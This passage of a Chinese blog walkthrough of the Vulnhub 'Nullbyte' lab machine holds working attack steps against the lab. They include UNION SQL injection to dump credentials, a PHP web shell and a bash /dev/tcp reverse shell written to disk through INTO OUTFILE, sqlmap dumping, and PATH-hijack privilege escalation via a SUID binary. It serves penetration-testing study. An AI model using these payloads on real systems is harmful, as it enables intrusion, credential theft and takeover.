+<figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">-<span class="hljs-number">1</span>&quot; union <span class="hljs-selector-tag">select</span> <span class="hljs-built_in">database</span>(),<span class="hljs-built_in">version</span>(),<span class="hljs-built_in">user</span>() -- -<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230160505.png"></p>
+<p>当前数据库名是 seth，版本高于5.1（存在 information_schema 这个表），当前用户是 root。</p>
+<p>获取表名:</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&quot;seth&quot;</span> -- -<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230161550.png"></p>
+<p>只有一张名为 users 的表。</p>
+<p>获取列名:</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&quot;seth&quot;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&quot;users&quot;</span> -- -<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230162112.png"></p>
+<p>获取用户名及密码：</p>
+<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">-1&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">user</span>, pass <span class="hljs-keyword">from</span> users -- -<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230162851.png"></p>
+<p>这组密码 hash-identifier 没识别出来，那么根据经验猜测这是 base64 密码，解密：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230163526.png"></p>
+<p>这串字符再用 hash-identifier 识别一下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230163622.png"></p>
+<p>解密 MD5:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230163732.png"></p>
+<p>至此，得到了一组用户信息，用户名是 ramses，密码是 omega。第一种方法展示完毕。</p>
+<ol start="2">
+<li><strong>写入一句话木马</strong></li>
+</ol>
+<p>已知后端语言是 php，一句话木马如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;shell&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>已知 Web 服务器是 Apache:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230170623.png"></p>
+<p>那么网站根目录就是 <code>/var/www/html</code>，目录爆破爆破的时候扫出了上传文件夹名称是 <code>uploads</code>，这个文件夹是一定有写入权限的。接下来就可以写入一句话木马了：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot; union select &quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot; into outfile &quot;</span>/<span class="hljs-keyword">var</span>/www/html/uploads/sh.php<span class="hljs-string">&quot;; -- -</span><br><span class="hljs-string"># 注意引号嵌套问题</span><br></code></pre></td></tr></table></figure>
+
+<p>实战中如果写入不成功的话，那么就是数据库 <code>secure_file_priv</code> 参数设置的问题。如果这个参数为空，那么这个变量没有效果；如果这个参数设为一个目录名，那么 MySQL 服务只允许在这个目录中执行文件的导入和导出操作。如果这个参数为NULL，MySQL服务会禁止导入和导出操作。</p>
+<p>通过 shell 参数执行 ls 命令试试：</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span>/uploads/<span class="hljs-keyword">sh</span>.php?<span class="hljs-keyword">shell</span>=<span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure>
+
+<p>后门上传成功：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230201133.png"></p>
+<p>秉承着少用图形化工具的原则，还是用命令行操作。查看 <code>/kzMb5nVYJw/420search.php</code>文件：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span><span class="hljs-regexp">/uploads/</span>shell.php?shell=cat%<span class="hljs-number">20</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>kzMb5nVYJw/<span class="hljs-number">420</span>search.php<br><span class="hljs-comment"># 注意空格用 url 编码 %20</span><br></code></pre></td></tr></table></figure>
+
+<p>得到了数据库的用户名及密码:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230182156.png"></p>
+<p>现在就可以登录 phpmyadmin 了，获取用户名密码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230182941.png"></p>
+<ol start="3">
+<li><strong>写入反弹 shell</strong></li>
+</ol>
+<p>既然可以写入一句话木马，那么也可以写入反弹 shell 语句:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.86.128/888 0&gt;&amp;1&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//bash -c 启动一个 Bash 进程</span><br></code></pre></td></tr></table></figure>
+
+<p>同样写入 uploads 目录，这次文件名指定为 reverse.php:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot; union select &quot;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(\<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;%26 /dev/tcp/192.168.86.128/888 0&gt;%261&#x27;\&quot;); ?&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span> into outfile <span class="hljs-string">&quot;/var/www/html/uploads/reverse.php&quot;</span>; -- -<br># 注意转义<br># 优先使用双引号包裹外层字符串<br># 这里 &amp; 需要 url 编码<br></code></pre></td></tr></table></figure>
+
+<p>这里卡了挺长时间，最后还是求助了，知道原来是<code>&amp;</code>被转义了。以后再遇到这种复杂命令，最好用 base64 编码后写入：</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle"><span class="hljs-string">&quot; union select &quot;</span>&lt;?base64_decode(cGhwIGV4ZWMoYmFzZTY0X2RlY29kZSgnWldOb2J5QW5TR1ZzYkc4Z2QyOXliR1FuT3c9PScpKQo=);?&gt;<span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot;,&quot;</span><span class="hljs-string">&quot; into outfile &quot;</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>ploads/<span class="hljs-keyword">reverse</span>.php<span class="hljs-string">&quot; -- -</span><br></code></pre></td></tr></table></figure>
+
+<p>本机开放 888 监听端口：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure>
+
+<p>访问 <a target="_blank" rel="noopener" href="http://192.168.86.130/uploads/reverse.php">http://192.168.86.130/uploads/reverse.php</a> ，即可触发反弹 shell:</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230212222.png"></p>
+<p>查看 420search.php 即可找到数据库用户名及密码。</p>
+<ol start="4">
+<li><strong>SQLmap</strong></li>
+</ol>
+<figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">sudo sqlmap -u <span class="hljs-symbol">&#x27;http</span>://<span class="hljs-number">192.168</span>.<span class="hljs-number">86.130</span>/kzMb5nVYJw/<span class="hljs-number">420</span>search.php?usrtosearch=&#x27; <span class="hljs-comment">--dump</span><br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230201824.png"></p>
+<h1 id="0x05-ssh登录及SUID提权"><a href="#0x05-ssh登录及SUID提权" class="headerlink" title="0x05 ssh登录及SUID提权"></a>0x05 ssh登录及SUID提权</h1><p>用户名是 ramses，密码是 omega，接下来就可以 ssh 登录了。</p>
+<p>注意靶机的 ssh 服务不是在默认的 22 端口，而是 777 端口：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> ramses@<span class="hljs-number">192.168.86.130</span> -p <span class="hljs-number">777</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来就是查看该用户的权限。</p>
+<p>查看 sudo 权限：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230202512.png"></p>
+<p>没有 sudo 权限，定时任务也没有操作空间。</p>
+<p>这里又学到一个思路，输入 <code>history</code> 查看历史记录。</p>
+<p>发现一个陌生的命令：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230205650.png"></p>
+<p>这个命令是在 <code>/var/www/backup/</code> 目录下，进入该目录，<code>ls-l</code> 查看文件权限：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230210122.png"></p>
+<p>发现 procwatch 的权限有 s 位，也就是有 SUID 权限。</p>
+<p>接下来的思路就类似于之前做过的 HTB-Oopsie 了。</p>
+<p>执行 procwatch ：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230212818.png"></p>
+<p>发现他执行了 <code>sh</code> 和 <code>ps</code> 命令。</p>
+<p>我们可以构造其中任意一个命令，添加到环境变量中。</p>
+<p>以 <code>ps</code> 为例，在当前的 backup 文件夹创建一个 <code>ps</code> 文件，内容是 <code>/bin/bash</code>:</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; <span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure>
+
+<p>给 <code>ps</code> 添加可执行权限：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">777</span> ps<br></code></pre></td></tr></table></figure>
+
+<p>并将<code>/backup</code>添加到环境变量：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/var/www/backup:$PATH<br></code></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230214115.png"></p>
+<p>Shell 会按照 <strong><code>PATH</code></strong> 中的路径顺序，依次在这些目录中搜索名为 <code>ps</code> 的可执行文件。找到后立即执行，不再继续查找。</p>
+<p>再次执行 procwatch，逻辑是没错的，但是提权失败了：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/613fe811-013b-48ed-bc82-c468628ad903.png"></p>
+<p>还是经过求助，发现换成 <code>sh</code> 就可以了：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/Pasted%20image%2020241230224733.png"></p>
+<p>除了创建文件之外，还有一种稍微简单的方法，建立软连接：</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ln</span> -s /bin/<span class="hljs-keyword">sh</span> <span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再添加环境变量，也是一样的。</p>
+<p>切换到 root 身份后，发现 sh 和 bash 权限是一样的。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/0ae762e81e34cfa0dc8ad00ab845597d.png"></p>
+<p>大佬说是bash被限制了。执行 <code>bash</code> 后权限降低了：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../images/7ad900362ff409ef80e97edb8908e5dd.png"></p>
+<h1 id="0x06-Conclusion"><a href="#0x06-Conclusion" class="headerlink" title="0x06 Conclusion"></a>0x06 Conclusion</h1><p>这个靶场属实是困住我太长时间了，过程中遇到很多问题，最后都是经过求助才解决的。虽然花了很长时间，不过以后再遇到类似情况，也知道如何排查问题了。过程中，操作更熟练了，理解得也更深了，就是要有越挫越勇的态度！</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">xxshh</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/12/30/Vulnhub-Nullbyte/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/12/30/Vulnhub-Nullbyte/')">Vulnhub-Nullbyte</span></a></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank"></a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Vulnhub/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Vulnhub<span class="tagsPageCount">4</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=68739c2c-2761-c36b-a931-49c9b440da9e" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">主机发现和端口扫描的原理及实现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/" title="Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%81%B0.jpg?_r_=0a652bcf-c1f7-3dab-70f8-c39692ee4f70" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-26</div><div class="title">Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路</div></div></a></div><div><a href="/2024/12/27/Vulnhub-JARBAS/" title="Vulnhub-JARBAS"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=30ed7b77-f493-348f-efcd-9bafd3e5c607" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-27</div><div class="title">Vulnhub-JARBAS</div></div></a></div><div><a href="/2024/12/28/Vulnhub-SickOS1-1/" title="Vulnhub-SickOS1.1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=722405b6-7313-1af3-912a-66ae286b7688" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-12-28</div><div class="title">Vulnhub-SickOS1.1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-Introduction"><span class="toc-number">1.</span> <span class="toc-text">0x00 Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">0x01 端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">0x02 Web渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">4.</span> <span class="toc-text">0x03 密码爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x04 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-ssh%E7%99%BB%E5%BD%95%E5%8F%8ASUID%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">0x05 ssh登录及SUID提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Conclusion"><span class="toc-number">7.</span> <span class="toc-text">0x06 Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/30/Vulnhub-Nullbyte/" title="Vulnhub-Nullbyte"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E6%A9%99.jpg?_r_=9e8de67c-de60-be2f-9752-9af783d619f3" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-Nullbyte"/></a><div class="content"><a class="title" href="/2024/12/30/Vulnhub-Nullbyte/" title="Vulnhub-Nullbyte">Vulnhub-Nullbyte</a><time datetime="2024-12-30T05:04:45.000Z" title="发表于 2024-12-30 13:04:45">2024-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/" title="主机发现和端口扫描的原理及实现"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=68739c2c-2761-c36b-a931-49c9b440da9e" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="主机发现和端口扫描的原理及实现"/></a><div class="content"><a class="title" href="/2024/12/29/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/" title="主机发现和端口扫描的原理及实现">主机发现和端口扫描的原理及实现</a><time datetime="2024-12-29T08:02:32.000Z" title="发表于 2024-12-29 16:02:32">2024-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/28/Vulnhub-SickOS1-1/" title="Vulnhub-SickOS1.1"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=722405b6-7313-1af3-912a-66ae286b7688" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-SickOS1.1"/></a><div class="content"><a class="title" href="/2024/12/28/Vulnhub-SickOS1-1/" title="Vulnhub-SickOS1.1">Vulnhub-SickOS1.1</a><time datetime="2024-12-28T05:36:29.000Z" title="发表于 2024-12-28 13:36:29">2024-12-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/27/Vulnhub-JARBAS/" title="Vulnhub-JARBAS"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=30ed7b77-f493-348f-efcd-9bafd3e5c607" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-JARBAS"/></a><div class="content"><a class="title" href="/2024/12/27/Vulnhub-JARBAS/" title="Vulnhub-JARBAS">Vulnhub-JARBAS</a><time datetime="2024-12-27T08:16:10.000Z" title="发表于 2024-12-27 16:16:10">2024-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/" title="Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%81%B0.jpg?_r_=0a652bcf-c1f7-3dab-70f8-c39692ee4f70" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路"/></a><div class="content"><a class="title" href="/2024/12/26/Vulnhub-W1R3S-1-0-1-%E8%AF%A6%E8%BF%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/" title="Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路">Vulnhub-W1R3S 1.0.1 &amp; 详述渗透测试思路</a><time datetime="2024-12-26T06:20:44.000Z" title="发表于 2024-12-26 14:20:44">2024-12-26</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By xxshh</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" 